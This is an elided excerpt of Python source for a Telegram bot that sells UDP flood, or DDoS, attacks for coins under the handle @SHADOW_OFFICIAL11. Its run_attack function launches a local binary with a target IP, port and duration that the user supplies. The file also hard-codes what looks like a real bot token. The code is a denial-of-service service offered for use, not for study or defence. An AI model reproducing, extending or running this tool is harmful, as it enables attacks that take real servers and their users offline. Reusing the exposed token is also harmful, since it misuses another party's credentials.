...
TELEGRAM_BOT_TOKEN = '7662081041:AAF7dPj1NcbL4OLY8dSCBPSft14JAbFSvAs'  # Replace with your bot token
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*❄️ WELCOME TO @SHADOW_OFFICIAL11 ULTIMATE UDP FLOODER ❄️*\n\n"
        ...
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: @SHADOW_OFFICIAL11*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @SHADOW_OFFICIAL11*",
            parse_mode='Markdown'
        )
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} {900}"
...
async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ @SHADOW_OFFICIAL11 VIP DDOS Bot Help Menu 🛠️*\n\n"
        ...
        "- *Agar koi dikkat aaye toh admin ko contact karo: @SHADOW_OFFICIAL11*\n\n"
